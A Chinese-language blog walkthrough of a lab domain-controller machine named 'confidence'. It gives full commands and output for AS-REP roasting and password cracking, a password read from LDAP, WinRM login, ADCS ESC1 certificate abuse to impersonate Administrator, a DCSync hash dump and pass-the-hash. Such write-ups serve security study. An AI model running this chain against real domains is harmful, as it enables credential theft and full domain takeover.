<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
<meta name="description" content="# 一、信息收集

## 1.1 主机发现

使用 arp-scan 进行网段扫描，发现目标主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                           
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.177 00:0c:29:6b:4e:b2       VMware, Inc.
...
```

确定目标主机IP为 `192.168.205.177`。">
<meta property="og:title" content="内部_confidence">
<meta property="og:description" content="# 一、信息收集

## 1.1 主机发现

使用 arp-scan 进行网段扫描，发现目标主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                           
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.177 00:0c:29:6b:4e:b2       VMware, Inc.
...
```

确定目标主机IP为 `192.168.205.177`。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_confidence.html">
<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
<title>内部_confidence</title>
<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />


</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">内部_confidence</h1>
<div class="title-right">
    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/248" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
<h2>1.1 主机发现</h2>
<p>使用 arp-scan 进行网段扫描，发现目标主机：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                           
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.177 00:0c:29:6b:4e:b2       VMware, Inc.
...</pre></div>
<p>确定目标主机IP为 <code class="notranslate">192.168.205.177</code>。</p>
<h2>1.2 端口扫描</h2>
<p>使用 RustScan 对目标主机进行端口扫描：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ rustscan -a 192.168.205.177
...
Open 192.168.205.177:53
Open 192.168.205.177:88
Open 192.168.205.177:135
Open 192.168.205.177:389
Open 192.168.205.177:445
Open 192.168.205.177:464
Open 192.168.205.177:636
Open 192.168.205.177:3268
Open 192.168.205.177:3269
Open 192.168.205.177:5985
Open 192.168.205.177:9389</pre></div>
<p>从开放的端口可以判断这是一台域控制器：</p>
<ul>
<li><strong>53</strong>: DNS服务</li>
<li><strong>88</strong>: Kerberos认证</li>
<li><strong>389/636</strong>: LDAP/LDAPS</li>
<li><strong>445</strong>: SMB服务</li>
<li><strong>5985</strong>: WinRM服务</li>
</ul>
<h2>1.3 SMB服务探测</h2>
<h3>1.3.1 SMB共享枚举</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient -L 192.168.205.177 -N               
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      远程管理
        C$              Disk      默认共享
        IPC$            IPC       远程 IPC
        NETLOGON        Disk      Logon server share 
        readme          Disk    
        SYSVOL          Disk      Logon server share </pre></div>
<p>发现了一个可疑的共享 <code class="notranslate">readme</code>。</p>
<h3>1.3.2 readme共享访问</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ smbclient //192.168.205.177/readme -N
smb: <span class="pl-cce">\&gt;</span> get readme.txt.txt 
smb: <span class="pl-cce">\&gt;</span> <span class="pl-c1">exit</span>

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat readme.txt.txt 
I<span class="pl-s"><span class="pl-pds">'</span>ve already disabled Windows Defender, and the system updates have been completed. So, enjoy exploring! If you run into any issues or get stuck, feel free to reach out to me, Wackymaker. My intention is simply to make sure everyone can learn something from this experience</span></pre></div>
<h2>1.4 域环境信息收集</h2>
<h3>1.4.1 时间同步</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo ntpdate -s 192.168.205.177</pre></div>
<h3>1.4.2 enum4linux枚举</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ enum4linux -a 192.168.205.177
...
[+] Got domain/workgroup name: CONFIDENCE
...
Domain Name: CONFIDENCE
Domain Sid: S-1-5-21-3649830887-1815587496-1699028491
[+] Host is part of a domain (not a workgroup)
...</pre></div>
<h3>1.4.3 配置hosts文件</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo vim /etc/hosts
192.168.205.177 confidence.com dc.confidence.com</pre></div>
<h1>二、用户枚举与AS-REP Roasting攻击</h1>
<h2>2.1 用户SID枚举</h2>
<p>使用 lookupsid.py 工具枚举域用户：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ lookupsid.py confidence.com/guest@192.168.205.177
...
500: CONFIDENCE<span class="pl-cce">\A</span>dministrator (SidTypeUser)
501: CONFIDENCE<span class="pl-cce">\G</span>uest (SidTypeUser)
502: CONFIDENCE<span class="pl-cce">\k</span>rbtgt (SidTypeUser)
...
1104: CONFIDENCE<span class="pl-cce">\c</span>a-user (SidTypeUser)
1105: CONFIDENCE<span class="pl-cce">\m</span>ulis (SidTypeUser)
1106: CONFIDENCE<span class="pl-cce">\h</span>yh (SidTypeUser)</pre></div>
<p>创建用户列表：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ <span class="pl-c1">echo</span> -e <span class="pl-s"><span class="pl-pds">"</span>Administrator\nGuest\nca-user\nmulis\nhyh<span class="pl-pds">"</span></span> <span class="pl-k">&gt;</span> user</pre></div>
<h2>2.2 AS-REP Roasting攻击</h2>
<p>检测是否存在不需要预认证的用户：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ GetNPUsers.py confidence.com/ -usersfile user -dc-ip 192.168.205.177 -format hashcat -outputfile <span class="pl-c1">hash</span>
...
[-] User Administrator doesn<span class="pl-s"><span class="pl-pds">'</span>t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="pl-s">[-] User Guest doesn<span class="pl-pds">'</span></span>t have UF_DONT_REQUIRE_PREAUTH <span class="pl-c1">set</span>
[-] User ca-user doesn<span class="pl-s"><span class="pl-pds">'</span>t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="pl-s">[-] User hyh doesn<span class="pl-pds">'</span></span>t have UF_DONT_REQUIRE_PREAUTH <span class="pl-c1">set</span></pre></div>
<p>成功获取到 <code class="notranslate">mulis</code> 用户的 AS-REP hash：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat <span class="pl-c1">hash</span>        
<span class="pl-smi">$krb5asrep</span><span class="pl-smi">$2</span>3<span class="pl-smi">$mulis</span>@CONFIDENCE.COM:c79a52a80039b6d8e16a6ff1fbf65378$...</pre></div>
<h2>2.3 Hash破解</h2>
<p>使用 John the Ripper 破解AS-REP hash：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span>
...
babygirl         (<span class="pl-smi">$krb5asrep</span><span class="pl-smi">$2</span>3<span class="pl-smi">$mulis</span>@CONFIDENCE.COM)   
1g 0:00:00:00 DONE 100.0g/s 409600p/s</pre></div>
<p>成功获取凭证：<code class="notranslate">mulis:babygirl</code></p>
<h2>2.4 凭证验证</h2>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ crackmapexec smb 192.168.205.177 -u mulis -p babygirl
SMB         192.168.205.177 445    DC               [<span class="pl-k">*</span>] Windows Server 2022 Build 20348 x64 (name:DC) (domain:confidence.com) (signing:True) (SMBv1:False)
SMB         192.168.205.177 445    DC               [+] confidence.com<span class="pl-cce">\m</span>ulis:babygirl </pre></div>
<h1>三、BloodHound域信息收集与权限分析</h1>
<h2>3.1 数据采集</h2>
<p>使用 bloodhound-python 收集域信息：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bloodhound-python -u mulis -p babygirl -ns 192.168.205.177 -d confidence.com -c all
INFO: BloodHound.py <span class="pl-k">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: confidence.com
...
INFO: Found 7 users
INFO: Found 53 groups
...
INFO: Done <span class="pl-k">in</span> 00M 00S</pre></div>
<h2>3.2 关键权限发现</h2>
<p>分析BloodHound收集的数据，在用户权限关系中发现关键信息：</p>
<div class="highlight highlight-source-json"><pre class="notranslate">{
  <span class="pl-ent">"ObjectIdentifier"</span>: <span class="pl-s"><span class="pl-pds">"</span>S-1-5-21-3649830887-1815587496-1699028491-1104<span class="pl-pds">"</span></span>,
  <span class="pl-ent">"Properties"</span>: {
    <span class="pl-ent">"name"</span>: <span class="pl-s"><span class="pl-pds">"</span>CA-USER@CONFIDENCE.COM<span class="pl-pds">"</span></span>
  },
  <span class="pl-ent">"Aces"</span>: [
    {
      <span class="pl-ent">"RightName"</span>: <span class="pl-s"><span class="pl-pds">"</span>GenericWrite<span class="pl-pds">"</span></span>,
      <span class="pl-ent">"IsInherited"</span>: <span class="pl-c1">false</span>,
      <span class="pl-ent">"PrincipalSID"</span>: <span class="pl-s"><span class="pl-pds">"</span>S-1-5-21-3649830887-1815587496-1699028491-1106<span class="pl-pds">"</span></span>,
      <span class="pl-ent">"PrincipalType"</span>: <span class="pl-s"><span class="pl-pds">"</span>User<span class="pl-pds">"</span></span>
    }
  ]
}</pre></div>
<p><strong>关键发现</strong>：用户 <code class="notranslate">hyh</code> (1106) 对用户 <code class="notranslate">ca-user</code> (1104) 拥有 <code class="notranslate">GenericWrite</code> 权限！</p>
<p>同时发现 <code class="notranslate">ca-user</code> 是 <code class="notranslate">ca-admin</code> 组的成员：</p>
<div class="highlight highlight-source-json"><pre class="notranslate"><span class="pl-ent">"Members"</span>: [
  {
    <span class="pl-ent">"ObjectIdentifier"</span>: <span class="pl-s"><span class="pl-pds">"</span>S-1-5-21-3649830887-1815587496-1699028491-1104<span class="pl-pds">"</span></span>,
    <span class="pl-ent">"ObjectType"</span>: <span class="pl-s"><span class="pl-pds">"</span>User<span class="pl-pds">"</span></span>
  }
]</pre></div>
<h1>四、LDAP信息挖掘获取hyh凭证</h1>
<h2>4.1 LDAP查询发现密码</h2>
<p>使用 mulis 凭证查询 hyh 用户信息：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ldapsearch -x -H ldap://192.168.205.177 -D <span class="pl-s"><span class="pl-pds">"</span>mulis@confidence.com<span class="pl-pds">"</span></span> -w babygirl -b <span class="pl-s"><span class="pl-pds">"</span>CN=hyh,CN=Users,DC=confidence,DC=com<span class="pl-pds">"</span></span> -s base <span class="pl-s"><span class="pl-pds">"</span>*<span class="pl-pds">"</span></span>
...
info: Password: 3948571026
memberOf: CN=Remote Management Users,CN=Builtin,DC=confidence,DC=com
...</pre></div>
<p>在 <code class="notranslate">info</code> 字段中发现了 hyh 用户的密码：<code class="notranslate">3948571026</code></p>
<h2>4.2 WinRM登录</h2>
<p>利用获取的凭证通过WinRM登录：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ evil-winrm -i 192.168.205.177 -u hyh -p 3948571026
...
<span class="pl-k">*</span>Evil-WinRM<span class="pl-k">*</span> PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\h</span>yh<span class="pl-cce">\D</span>esktop<span class="pl-k">&gt;</span> <span class="pl-c1">type</span> user.txt
this user flag</pre></div>
<h1>五、GenericWrite权限利用与证书服务攻击</h1>
<h2>5.1 GenericWrite权限说明</h2>
<p>GenericWrite权限允许攻击者修改目标用户对象的多种属性，包括：</p>
<ul>
<li>密码重置</li>
<li>用户属性修改</li>
<li>SPN设置</li>
<li>组成员关系</li>
</ul>
<h2>5.2 证书服务枚举</h2>
<p>使用 Certipy 枚举证书模板：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ certipy-ad find -u hyh@confidence.com -p 3948571026 -dc-ip 192.168.205.177 -vulnerable -stdout
...
Certificate Templates
  0
    Template Name                       <span class="pl-c1">:</span> ca-login
    Display Name                        <span class="pl-c1">:</span> ca-login
    Certificate Authorities             <span class="pl-c1">:</span> confidence-DC-CA
    Enabled                             <span class="pl-c1">:</span> True
    Client Authentication               <span class="pl-c1">:</span> True
    Enrollee Supplies Subject           <span class="pl-c1">:</span> True
    Authorized Signatures Required      <span class="pl-c1">:</span> 0
    Enrollment Rights                   <span class="pl-c1">:</span> CONFIDENCE.COM<span class="pl-cce">\c</span>a-admin
                                          CONFIDENCE.COM<span class="pl-cce">\D</span>omain Admins
                                          CONFIDENCE.COM<span class="pl-cce">\D</span>omain Computers
                                          CONFIDENCE.COM<span class="pl-cce">\E</span>nterprise Admins
    [+] User Enrollable Principals      <span class="pl-c1">:</span> CONFIDENCE.COM<span class="pl-cce">\D</span>omain Computers
    [<span class="pl-k">!</span>] Vulnerabilities
      ESC1                              <span class="pl-c1">:</span> Enrollee supplies subject and template allows client authentication.</pre></div>
<p>关键发现：</p>
<ul>
<li><strong>ESC1漏洞</strong>：证书模板允许申请者提供主题名称</li>
<li><strong>ca-admin组权限</strong>：该组可以注册证书</li>
<li><strong>ca-user是ca-admin成员</strong></li>
</ul>
<h2>5.3 创建机器账户用于证书申请</h2>
<p>添加机器账户以利用Domain Computers权限：</p>
<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\hyh\Desktop<span class="pl-k">&gt;</span> net computer \\EVILPC <span class="pl-k">/</span>add
命令成功完成。

<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\hyh\Desktop<span class="pl-k">&gt;</span> <span class="pl-smi">$machinepass</span> <span class="pl-k">=</span> <span class="pl-c1">ConvertTo-SecureString</span> <span class="pl-s"><span class="pl-pds">"</span>passwd123<span class="pl-pds">"</span></span> <span class="pl-k">-</span>AsPlainText <span class="pl-k">-</span>Force
<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\hyh\Desktop<span class="pl-k">&gt;</span> <span class="pl-c1">Set-ADAccountPassword</span> <span class="pl-k">-</span>Identity <span class="pl-s"><span class="pl-pds">"</span>EVILPC$<span class="pl-pds">"</span></span> <span class="pl-k">-</span>NewPassword <span class="pl-smi">$machinepass</span> <span class="pl-k">-</span>Reset</pre></div>
<h2>5.4 获取Administrator SID</h2>
<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\hyh\Desktop<span class="pl-k">&gt;</span> <span class="pl-c1">Get-ADUser</span> administrator <span class="pl-k">|</span> select SID
SID
<span class="pl-k">---</span>
S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">21</span><span class="pl-k">-</span><span class="pl-c1">3649830887</span><span class="pl-k">-</span><span class="pl-c1">1815587496</span><span class="pl-k">-</span><span class="pl-c1">1699028491</span><span class="pl-k">-</span><span class="pl-c1">500</span></pre></div>
<h2>5.5 ESC1漏洞利用</h2>
<p>使用机器账户申请Administrator的证书：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ certipy-ad req -u <span class="pl-s"><span class="pl-pds">'</span>EVILPC$@confidence.com<span class="pl-pds">'</span></span> -p <span class="pl-s"><span class="pl-pds">'</span>passwd123<span class="pl-pds">'</span></span> -ca confidence-DC-CA -template ca-login -upn administrator@confidence.com -sid S-1-5-21-3649830887-1815587496-1699028491-500 -dc-ip 192.168.205.177
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[<span class="pl-k">*</span>] Requesting certificate via RPC
[<span class="pl-k">*</span>] Request ID is 5
[<span class="pl-k">*</span>] Successfully requested certificate
[<span class="pl-k">*</span>] Got certificate with UPN <span class="pl-s"><span class="pl-pds">'</span>administrator@confidence.com<span class="pl-pds">'</span></span>
[<span class="pl-k">*</span>] Certificate object SID is <span class="pl-s"><span class="pl-pds">'</span>S-1-5-21-3649830887-1815587496-1699028491-500<span class="pl-pds">'</span></span>
[<span class="pl-k">*</span>] Saving certificate and private key to <span class="pl-s"><span class="pl-pds">'</span>administrator.pfx<span class="pl-pds">'</span></span>
[<span class="pl-k">*</span>] Wrote certificate and private key to <span class="pl-s"><span class="pl-pds">'</span>administrator.pfx<span class="pl-pds">'</span></span></pre></div>
<h1>六、域管理员权限获取</h1>
<h2>6.1 证书认证获取TGT和NT Hash</h2>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ certipy-ad auth -pfx administrator.pfx -username administrator -domain confidence.com -dc-ip 192.168.205.177
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[<span class="pl-k">*</span>] Certificate identities:
[<span class="pl-k">*</span>]     SAN UPN: <span class="pl-s"><span class="pl-pds">'</span>administrator@confidence.com<span class="pl-pds">'</span></span>
[<span class="pl-k">*</span>]     SAN URL SID: <span class="pl-s"><span class="pl-pds">'</span>S-1-5-21-3649830887-1815587496-1699028491-500<span class="pl-pds">'</span></span>
[<span class="pl-k">*</span>]     Security Extension SID: <span class="pl-s"><span class="pl-pds">'</span>S-1-5-21-3649830887-1815587496-1699028491-500<span class="pl-pds">'</span></span>
[<span class="pl-k">*</span>] Using principal: <span class="pl-s"><span class="pl-pds">'</span>administrator@confidence.com<span class="pl-pds">'</span></span>
[<span class="pl-k">*</span>] Trying to get TGT...
[<span class="pl-k">*</span>] Got TGT
[<span class="pl-k">*</span>] Saving credential cache to <span class="pl-s"><span class="pl-pds">'</span>administrator.ccache<span class="pl-pds">'</span></span>
[<span class="pl-k">*</span>] Wrote credential cache to <span class="pl-s"><span class="pl-pds">'</span>administrator.ccache<span class="pl-pds">'</span></span>
[<span class="pl-k">*</span>] Trying to retrieve NT <span class="pl-c1">hash</span> <span class="pl-k">for</span> <span class="pl-s"><span class="pl-pds">'</span>administrator<span class="pl-pds">'</span></span>
[<span class="pl-k">*</span>] Got <span class="pl-c1">hash</span> <span class="pl-k">for</span> <span class="pl-s"><span class="pl-pds">'</span>administrator@confidence.com<span class="pl-pds">'</span></span>: aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34</pre></div>
<h2>6.2 DCSync攻击</h2>
<p>使用TGT票据执行DCSync攻击：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ <span class="pl-k">export</span> KRB5CCNAME=administrator.ccache

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ secretsdump.py -k confidence.com/administrator@dc.confidence.com -no-pass -just-dc   
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[<span class="pl-k">*</span>] Dumping Domain Credentials (domain<span class="pl-cce">\u</span>id:rid:lmhash:nthash)
[<span class="pl-k">*</span>] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:45ea529d24347b6d23041e1258cc3db3:::
ca-user:1104:aad3b435b51404eeaad3b435b51404ee:8636734a8c71b741a33bcb2bf323ea5c:::
mulis:1105:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
hyh:1106:aad3b435b51404eeaad3b435b51404ee:98ae07bdfd021b71d75f40c64cef14ed:::
...</pre></div>
<h2>6.3 域控制器访问</h2>
<p>使用Administrator hash进行Pass-the-Hash攻击：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ evil-winrm -i 192.168.205.177 -u administrator -H bbabdc192282668fe5190ab0c5150b34
...
<span class="pl-k">*</span>Evil-WinRM<span class="pl-k">*</span> PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>ocuments<span class="pl-k">&gt;</span> whoami 
confidence<span class="pl-cce">\a</span>dministrator

<span class="pl-k">*</span>Evil-WinRM<span class="pl-k">*</span> PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-k">&gt;</span> <span class="pl-c1">type</span> root.txt
this root  and thank you</pre></div></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
